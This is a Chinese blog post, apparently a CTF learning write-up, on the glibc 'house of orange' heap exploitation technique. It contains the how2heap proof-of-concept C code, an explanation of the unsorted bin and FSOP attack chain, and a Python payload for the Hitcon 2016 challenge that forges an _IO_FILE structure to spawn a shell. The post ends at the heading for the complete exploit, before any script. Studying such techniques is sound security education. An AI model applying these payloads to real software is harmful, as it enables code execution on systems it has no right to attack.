@@ -1,0 +1,1322 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwn,how2heap," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="how2heap house_of_orange 利用unsorted bin attack覆盖_io_list_all指向可控内存，并在其中构造_IO_FILE_plus结构体来控制流程">
+<meta name="keywords" content="pwn,how2heap">
+<meta property="og:type" content="article">
+<meta property="og:title" content="house-of-orange">
+<meta property="og:url" content="http://yoursite.com/2019/09/24/house-of-orange/index.html">
+<meta property="og:site_name" content="Muirelle的博客">
+<meta property="og:description" content="how2heap house_of_orange 利用unsorted bin attack覆盖_io_list_all指向可控内存，并在其中构造_IO_FILE_plus结构体来控制流程">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://i.imgur.com/9lYNm4m.png">
+<meta property="og:image" content="https://i.imgur.com/G6xNbGp.png">
+<meta property="og:image" content="https://i.imgur.com/6lnW48S.png">
+<meta property="og:image" content="https://i.imgur.com/qYwJfNw.png">
+<meta property="og:image" content="https://i.imgur.com/qxfaJ4m.png">
+<meta property="og:image" content="https://i.imgur.com/XNpj4as.png">
+<meta property="og:image" content="https://i.imgur.com/2qVFbjD.png">
+<meta property="og:image" content="https://i.imgur.com/WCTLcLs.png">
+<meta property="og:image" content="https://i.imgur.com/0ZBrv0C.png">
+<meta property="og:image" content="https://i.imgur.com/cDdt1H1.png">
+<meta property="og:image" content="https://i.imgur.com/cPsqFZA.png">
+<meta property="og:image" content="https://i.imgur.com/E3kstfK.png">
+<meta property="og:image" content="https://i.imgur.com/bl4h4zs.png">
+<meta property="og:image" content="https://i.imgur.com/MqR2H6A.png">
+<meta property="og:image" content="https://i.imgur.com/qioBX5Q.png">
+<meta property="og:image" content="https://i.imgur.com/z8kzykQ.png">
+<meta property="og:image" content="https://i.imgur.com/oa8UQ1s.png">
+<meta property="og:updated_time" content="2019-10-07T13:39:37.459Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="house-of-orange">
+<meta name="twitter:description" content="how2heap house_of_orange 利用unsorted bin attack覆盖_io_list_all指向可控内存，并在其中构造_IO_FILE_plus结构体来控制流程">
+<meta name="twitter:image" content="https://i.imgur.com/9lYNm4m.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/09/24/house-of-orange/"/>
+
+
+
+
+
+  <title>house-of-orange | Muirelle的博客</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Muirelle的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/24/house-of-orange/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Muirelle">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/Sidebar_Avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Muirelle的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">house-of-orange</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-09-24T19:52:54+08:00">
+                2019-09-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2019/09/24/house-of-orange/" class="leancloud_visitors" data-flag-title="house-of-orange">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>how2heap <strong><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.25/house_of_orange.c" target="_blank" rel="noopener">house_of_orange</a></strong></p>
+<p><strong>利用unsorted bin attack覆盖_io_list_all指向可控内存，并在其中构造_IO_FILE_plus结构体来控制流程</strong></p>
+<a id="more"></a>
+<p>源码(省去注释):</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">winner</span> <span class="params">(<span class="keyword">char</span> *ptr)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *p1, *p2;</span><br><span class="line">    <span class="keyword">size_t</span> io_list_all, *top;</span><br><span class="line">    p1 = <span class="built_in">malloc</span>(<span class="number">0x400</span><span class="number">-16</span>);</span><br><span class="line">    top = (<span class="keyword">size_t</span> *) ( (<span class="keyword">char</span> *) p1 + <span class="number">0x400</span> - <span class="number">16</span>);</span><br><span class="line">    top[<span class="number">1</span>] = <span class="number">0xc01</span>;</span><br><span class="line">    p2 = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    io_list_all = top[<span class="number">2</span>] + <span class="number">0x9a8</span>;</span><br><span class="line">    top[<span class="number">3</span>] = io_list_all - <span class="number">0x10</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>( ( <span class="keyword">char</span> *) top, <span class="string">"/bin/sh\x00"</span>, <span class="number">8</span>);</span><br><span class="line">    top[<span class="number">1</span>] = <span class="number">0x61</span>;</span><br><span class="line">    _IO_FILE *fp = (_IO_FILE *) top;</span><br><span class="line">    fp-&gt;_mode = <span class="number">0</span>; <span class="comment">// top+0xc0</span></span><br><span class="line">    fp-&gt;_IO_write_base = (<span class="keyword">char</span> *) <span class="number">2</span>; <span class="comment">// top+0x20</span></span><br><span class="line">    fp-&gt;_IO_write_ptr = (<span class="keyword">char</span> *) <span class="number">3</span>; <span class="comment">// top+0x28</span></span><br><span class="line">    <span class="keyword">size_t</span> *jump_table = &amp;top[<span class="number">12</span>]; <span class="comment">// controlled memory</span></span><br><span class="line">    jump_table[<span class="number">3</span>] = (<span class="keyword">size_t</span>) &amp;winner;</span><br><span class="line">    *(<span class="keyword">size_t</span> *) ((<span class="keyword">size_t</span>) fp + <span class="keyword">sizeof</span>(_IO_FILE)) = (<span class="keyword">size_t</span>) jump_table; <span class="comment">// top+0xd8</span></span><br><span class="line">    <span class="comment">/* Finally, trigger the whole chain by calling malloc */</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">10</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">winner</span><span class="params">(<span class="keyword">char</span> *ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(ptr);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="流程-part1：unsoretd-bin-attack"><a href="#流程-part1：unsoretd-bin-attack" class="headerlink" title="流程 part1：unsoretd bin attack"></a>流程 part1：unsoretd bin attack</h3><ul>
+<li>p1 = malloc(0x400-16)，假设p1存在溢出，且可以覆盖top chunk的size</li>
+<li>top[1] = 0xc01，覆盖size，使得top_head + size在内存页对齐(一个内存页大小为4K，即0x1000，所以top_head+size要为0x1000的倍数)</li>
+<li>p2 = malloc(0x1000)，malloc的大小需大于top chunk的size，使得能够触发sbrk扩展出new_top，p2则位于new top_chunk中</li>
+<li>old top_chunk剩余的部分则被free添加到unsorted bin中，同时其fd，bk也更新为指向</li>
+<li></li>
+</ul>
+<h3 id="流程-part2-IO-FILE-attack-FSOP"><a href="#流程-part2-IO-FILE-attack-FSOP" class="headerlink" title="流程 part2:_IO_FILE attack(FSOP)"></a>流程 part2:_IO_FILE attack(FSOP)</h3><ul>
+<li>io_list_all = bk(main_arena+88)+0x9a8，io_list_all位于main_arena+88+0x9a8</li>
+<li>top[3] = io_list_all - 0x10，利用溢出覆盖bk为_IO_list_all-0x10</li>
+<li>memcpy( ( char *) top, “/bin/sh\x00”, 8)，在old top_chunk头部填充’/bin/sh’作为system的参数</li>
+<li>top[1] = 0x61，利用溢出覆盖top的size为0x61，此时fake _IO_FILE struct已经准备好了，开始向其中某些成员变量填充值以完成最后的attack </li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;mode = 0</span><br><span class="line">fp-&gt;_IO_write_base = (char *) 2</span><br><span class="line">fp-&gt;_IO_write_ptr = (char *)  3</span><br><span class="line">size_t *jump_table = &amp;top[12]</span><br><span class="line">jump_table[3] = (size_t) &amp;winner</span><br><span class="line">*(size_t *) ((size_t) fp + sizeof(_IO_FILE)) = (size_t) jump_table</span><br><span class="line">malloc(10)</span><br></pre></td></tr></table></figure>
+<h2 id="分析-amp-理解："><a href="#分析-amp-理解：" class="headerlink" title="分析&amp;理解："></a>分析&amp;理解：</h2><h3 id="part1"><a href="#part1" class="headerlink" title="part1"></a>part1</h3><p>part1主要进行内存泄露，为part2的FSOP做准备。</p>
+<p>一般进行内存泄露会想到用free一个非fastbin来泄露fd，bk上的main_arena从而得到libc base。但当程序不提供free时，part1提供了另外一种思路，在没有free的情况下也能调用free。</p>
+<p>我们知道，用户申请的chunk来自于top chunk的分裂，而top chunk的初始大小是一定的(0x21000)，所以随着申请的chunk越来越多，top chunk剩下的部分会越来越少，当剩余部分小于用户请求的大小时会调用sysmalloc()。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">  <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">	alloc_perturb (p, bytes);</span><br><span class="line">  <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>并分为两种情况：1. 申请大小小于<code>mp_.mmap_threshold</code><a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#198" target="_blank" rel="noopener">[1]</a><a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#1778" target="_blank" rel="noopener">[2]</a><a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#2296" target="_blank" rel="noopener">[3]</a>，则调用brk从old top_chunk尾部向后扩展出new top_chunk。2. 申请大小大于<code>mp_.mmap_threshold</code>，则调用mmap()。</p>
+<p>为了调用<a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#2435" target="_blank" rel="noopener">_int_free</a>，则需要进入第一种情况：new top_chunk生成后，对old top_chunk调用_int_free，然后被添加到unsorted bin，fd和bk被设置为main_arena+88，从而泄露libc base。</p>
+<p>在这之前还有一些检查：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">	  ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">	   prev_inuse (old_top) &amp;&amp;</span><br><span class="line">	   ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br><span class="line"><span class="comment">/* Precondition: not enough current space to satisfy nb request */</span></span><br><span class="line">assert ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE));</span><br></pre></td></tr></table></figure></p>
+<p>所以，构造的top_chunk size还要满足一下条件：</p>
+<ul>
+<li>size大于MINSIZE且小于需求的大小</li>
+<li>prev_inuse = 1</li>
+<li>top_chunk + size满足页对齐</li>
+</ul>
+<p><img src="https://i.imgur.com/9lYNm4m.png" alt=""></p>
+<h3 id="patr2"><a href="#patr2" class="headerlink" title="patr2"></a>patr2</h3><p>IO_FILE相关知识：</p>
+<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/introduction-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/introduction-zh/</a></p>
+<p>part2进行FSOP，布置攻击链，最后用malloc(10)触发。</p>
+<p>FSOP的思想是伪造_IO_FILE结构体和vtable，利用方式是使malloc报错，从而触发函数调用链：malloc_printerr -&gt; _libc_message -&gt; abort -&gt; _IO_flush_all_lockp，_IO_flush_all_lockp会从_IO_list_all指向的第一个<a href="https://code.woboq.org/userspace/glibc/libio/libioP.h.html#_IO_FILE_plus" target="_blank" rel="noopener">IO_FILE_plus</a>结构体开始遍历，为每一个结构体调用其vtable中的_IO_overflow。<strong>因此，只要劫持IO_list_all，使得IO_FILE_ chain中有我们伪造的结构体，接着将fake vtable中的_IO_overflow替换为system，再在合适的位置传递参数’/bin/sh’，并绕过一些检查，在触发报错的同时就可以拿到shell。</strong></p>
+<p>所以现在需要找到一块可控的内存以伪造_IO_FILE_plus：</p>
+<p>利用part1泄露的main_arena，计算出_io_file_list的位置，然后就能将old top_chunk的bk覆盖为_io_file_list-0x10。进行malloc时，由于old top_chunk不属于last reminder，所以malloc(10)不会让old top_chunk分裂返回给用户，而是将其添加到对应大小的bin中。因为要将unsorted bin中的chunk放入small/large bin，所以先要将其从unsorted bin中取出来，至此触发攻击链的第一步：利用取出操作将io_list_all指向main_arena+88。</p>
+<p><img src="https://i.imgur.com/G6xNbGp.png" alt=""></p>
+<p>现在已经控制_IO_list_all指向了main_arena+88，如果我们能在main_arena中布置fake _IO_FILE_plus就可以控制程序流，但事实上很难控制main_arena中的值。</p>
+<p>由于main_arena+88被_IO_list_all视为链表中的(首个)_IO_FILE_plus结构体，_IO_FILE中*_chain所处的偏移为0x68，而恰好在以main_arena+88为起始的偏移为0x68处对应的是大小为0x60的smallbin(即smallbin[4])的bk，也就是说如果我们将old top_chunk size覆盖为0x61，在malloc时，他就会被归类到smallbin[4]，正好是_chain所指向的下一个_IO_FILE结构体。所以只要在old top_chunk中布置好各种参数，在_IO_flush_all_lockp遍历链表时自然会执行到我们的攻击链上。</p>
+<p>因为old top_chunk的大小被修改后属于small bin，所以计算该chunk的大小属于small bin的哪一个index，然后将bck和fwd设置为指向对应的small bin index</p>
+<p><img src="https://i.imgur.com/6lnW48S.png" alt=""></p>
+<p>紧接着就是将其放入small bin中，所以small bin[5] (index=1的small bin为0x30字节，所以index=4为0x60字节)指向了old top_chunk。</p>
+<p><img src="https://i.imgur.com/qYwJfNw.png" alt=""></p>
+<p>流程大致如下：</p>
+<p><img src="https://i.imgur.com/qxfaJ4m.png" alt=""></p>
+<p>old top_chunk被从unsorted bin添加到small bin后，由于unsorted bin的bk不为空，所以逆向遍历unsorted bin的流程还没有结束(直到unsorted bin中没有chunk或是循环次数已达上限)，于是重新回到while循环开头，执行if判断：</p>
+<p><img src="https://i.imgur.com/XNpj4as.png" alt=""><br><img src="https://i.imgur.com/2qVFbjD.png" alt=""><br>而此时的victim-&gt;size == 0 ，满足if条件，进而执行<code>malloc_printerr</code>。</p>
+<p>从而进入函数<a href="https://code.woboq.org/userspace/glibc/sysdeps/posix/libc_fatal.c.html#__libc_message" target="_blank" rel="noopener">__libc_massage</a><br><img src="https://i.imgur.com/WCTLcLs.png" alt=""></p>
+<p>然后是<a href="https://code.woboq.org/userspace/glibc/libio/genops.c.html#685" target="_blank" rel="noopener">_IO_flush_all_lockp</a><br><img src="https://i.imgur.com/0ZBrv0C.png" alt=""><br>进入_IO_flush_all_lockp后找到了调用_IO_OVERFLOW的地方<br><img src="https://i.imgur.com/cDdt1H1.png" alt=""></p>
+<p>但是需要满足一些条件才能执行到_IO_OVERFLOW</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> _IO_vtable_offset (fp) == <span class="number">0</span> &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br></pre></td></tr></table></figure>
+<p>根据if内容可以推断出以上两个条件满足任意一个就可以执行_IO_OVERFLOW，第一个似乎容易些，所以我们选择在old top_chunk中伪造第一个条件所需要的参数，然后伪造其他参数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memcpy</span>( ( <span class="keyword">char</span> *) top, <span class="string">"/bin/sh\x00"</span>, <span class="number">8</span>); <span class="comment">//给system传递参数</span></span><br><span class="line">fp-&gt;_mode = <span class="number">0</span>; </span><br><span class="line">fp-&gt;_IO_write_base = (<span class="keyword">char</span> *)<span class="number">2</span>;</span><br><span class="line">fp-&gt;_IO_write_base = (<span class="keyword">char</span> *)<span class="number">3</span>; <span class="comment">// 前三条满足上述if判断</span></span><br><span class="line"><span class="keyword">size_t</span> *jump_table = &amp;top[<span class="number">12</span>]; <span class="comment">//在可控内存伪造vtable</span></span><br><span class="line">jump_table[<span class="number">3</span>] = (<span class="keyword">size_t</span>) &amp;winner; <span class="comment">//在vtable[3]处覆盖_IO_OVERFLOW为winner</span></span><br><span class="line">*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span>) fp + <span class="keyword">sizeof</span>(_IO_FILE)) = (<span class="keyword">size_t</span>) jump_table; <span class="comment">//控制vtable指针指向刚才伪造的区域</span></span><br></pre></td></tr></table></figure>
+<p>参数布置好后，堆中old top_chunk的整体情况：<br><img src="https://i.imgur.com/cPsqFZA.png" alt=""></p>
+<p>最后执行到_IO_OVERFLOW时可以看到已经被替换成了winner的地址<br><img src="https://i.imgur.com/E3kstfK.png" alt=""><br><img src="https://i.imgur.com/bl4h4zs.png" alt=""></p>
+<p>最后在报错的同时，拿到了shell：<br><img src="https://i.imgur.com/MqR2H6A.png" alt=""></p>
+<h2 id="Hitcon-2016-houseoforange"><a href="#Hitcon-2016-houseoforange" class="headerlink" title="Hitcon 2016 houseoforange"></a>Hitcon 2016 houseoforange</h2><p>题目来自how2heap<br><a href="https://drive.google.com/open?id=14ablm3PSKd1q0RDQUt4rZa-FCy7_wCSo" target="_blank" rel="noopener">下载连接</a></p>
+<h3 id="分析函数"><a href="#分析函数" class="headerlink" title="分析函数"></a>分析函数</h3><p>题目提供了三个功能：申请chunk、修改chunk和查看chunk。没有释放chunk</p>
+<p><strong>build：</strong></p>
+<p>若全局变量 build_count &gt; 3则提示已满并exit</p>
+<p>新建一个house，一共会创建三个chunk，第一个和第三个chunk的大小固定为0x20，第二个大小为用户自定义且最大为0x1000。</p>
+<p>第一个chunk包含的信息：两个指针，第一个指向第三个chunk，第二个指向第二个chunk<br>第二个chunk包含的信息：用户自定内容，不可溢出<br>第三个chunk包含的信息：前8字节分为两个dword，低位存price，高位存color+30</p>
+<p>同时更新全局变量：<br>_QWORD 0x203068 last_build_name指向第二个chunk<br>_DWORD 0x203070 build_count++</p>
+<p><strong>upgrade:</strong></p>
+<p>若全局变量upgrade_count &gt; 2则提示修改次数达上限并返回main<br>若全局变量last_build_name为空则提示没有house并返回main</p>
+<p>以小于0x1000的任意长度字符串修改最近一个house中第二个chunk的name内容(此处为溢出点)<br>修改chunk1中price指向的内容<br>修改color</p>
+<p>同时更新全局变量：<br>_DWORD 0x203074 upgrade_count++</p>
+<p><strong>see:</strong></p>
+<p>若全局变量last_build_name为空则提示没有house并返回main</p>
+<p>打印最近一个house的信息</p>
+<hr>
+<h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p>build第一个house并upgrade，覆盖top chunk的size，使其满足：size小于0x1000，&amp;top chunk+size页对齐，previnuse位为1</p>
+<p>bulid第二个house，大小为0x1000，触发sysmalloc和_int_free，使得old top_chunk被添加到unsorted bin，同时fd，bk被设置</p>
+<p>bulid第三个house，大小为large bin，此时填写的name位于之前old top_chunk的fd处，所以填充7个字节(加上换行共8字节)，调用see，可以泄露出main_arena，根据偏移计算出libc base。再次upgrade填充0xf字节，泄露fd_nextsize处的值，该值指向malloc该chunk前，old top_chunk head处的地址，根据偏移计算出heap base。</p>
+<p>申请第三个house时，会在large bin中搜索大小满足的chunk，由于large bin中没有chunk，所以把unsorted bin中的old top_chunk放入large bin中对应大小的index下(这里的index为98)，并设置好fd，bk，fd_nextsize和bk_nextsize；fd和bk分别指向main_arena中对应index的bin head；</p>
+<p><img src="https://i.imgur.com/qioBX5Q.png" alt=""><br>设置fd，bk，fwd，bck以完成large bin双向链表的创建：<br><img src="https://i.imgur.com/z8kzykQ.png" alt=""><br>形成的双向链表：<br><img src="https://i.imgur.com/oa8UQ1s.png" alt=""></p>
+<p>fd_nextsize和bk_nextsize分别指向large bin中前一个large bin head和后一个large bin head，由于只有这一个chunk，所以都指向自己。</p>
+<p>libc_leak为0x00007ffff7dd2188<br>heap_leak为0x0000555555758130<br>vmmap查看libc_base，相减得到偏移为0x3c5188<br>heap_leak减去之前在old top chunk申请过的总大小(0x130)，得到heap_base</p>
+<p>有了libc和heap就可以开始构造_IO_list_all了：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'/bin/sh\x00'</span> + p64(<span class="number">0x61</span>)</span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>) + p64(io_list_all<span class="number">-0x10</span>)</span><br><span class="line">payload += p64(<span class="number">2</span>) + p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">9</span></span><br><span class="line">payload += p64(system)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">11</span></span><br><span class="line">payload += p64(vtable)</span><br></pre></td></tr></table></figure>
+<p>最后再用一次upgrade触发攻击链，拿到shell</p>
+<p>完整exp:</p>
